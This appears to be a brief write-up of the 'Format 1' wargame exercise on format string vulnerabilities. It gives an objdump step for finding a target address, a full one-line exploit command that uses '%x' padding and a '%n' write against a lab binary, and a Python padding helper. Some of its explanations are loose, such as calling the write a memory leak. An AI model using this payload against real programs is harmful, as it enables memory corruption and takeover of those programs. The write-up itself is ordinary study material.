# Format 1
Format string vulnerabilities. (Memory Leak) <br>
Functions are called simply by placing they're address at the stack <br>

Using `objdump -t` we can find the target address.
Since the program arguments are symply stored at the stack
```
./format1 "`python -c "print 'AAAA' + '\x38\x96\x04\x08' + 'BBBB' + '%x '*127 + '%n '"`"
```

```python
def pad(s):
    return (s+"A"*500)[:500] #returns only first 500 chars

pad("Hello")
```
